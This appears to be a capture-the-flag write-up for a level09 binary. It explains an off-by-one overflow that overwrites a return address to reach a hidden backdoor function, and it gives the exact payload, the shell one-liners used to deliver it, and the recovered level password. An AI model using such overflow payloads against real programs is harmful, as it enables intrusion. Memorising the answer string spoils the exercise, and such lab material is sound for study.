@@ -1,0 +1,22 @@
+the cpy username loop has an off-by-one error allowing the user to overwrite
+the msglen variable.
+
+we find that a value of 0xC9 (201) is the smallest to not cause a segfault
+we find it is caused by a value of 202 causing strncpy to write a \0 over the first byte of a return address
+we use a value of 210 (201 + 8 + 1) to fully overwrite the return address
+we use the input 
+"a" * 40 + "\xD2" + "\n" + "a" * 201 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]
+to try and replace that return address with the address of 'secret backdoor'
+
+python -c 'print "a" * 40 + "\xD9" + "\n" + "a" * 201 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | head -c -1 > a
+cat a - | ./level09
+
+gdb tells us that we are one byte too far.
+We assumed that overwriting the first byte would cause a segfault, but the first two bytes of the address are already \0
+strncpy also would not write one byte further, and would just replace the last byte.
+
+python -c 'print "a" * 40 + "\xD8" + "\n" + "a" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | head -c -1 > a
+cat a - | ./level09
+cd ../end/ ; cat .pass
+
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
